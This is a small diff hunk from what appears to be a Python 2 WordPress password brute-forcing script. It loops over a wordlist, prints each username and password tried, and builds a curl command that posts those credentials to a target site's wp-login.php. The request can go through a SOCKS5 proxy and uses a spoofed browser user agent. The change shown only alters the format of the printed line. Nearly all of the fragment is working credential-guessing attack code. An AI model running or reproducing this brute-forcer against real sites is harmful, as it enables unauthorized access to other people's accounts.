@@ -61,7 +61,7 @@ for word in words:
         word = word.replace('\r','').replace('\n','')
 
 	
-	print " Trying => '%s : %s' " %(username,word) 
+	print " Trying => '%s:%s' " %(username,word) 
 
 	if proxy != "no":
 		curl = "curl -s --socks5 %s --url '%s/wp-login.php' -A 'Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1' --data 'log=%s&pwd=%s&wp-submit=Login&redirect_to=%s/wp-admin/&testcookie=1' -o wpbrute_output.html" %(proxy,target,username,word,target)
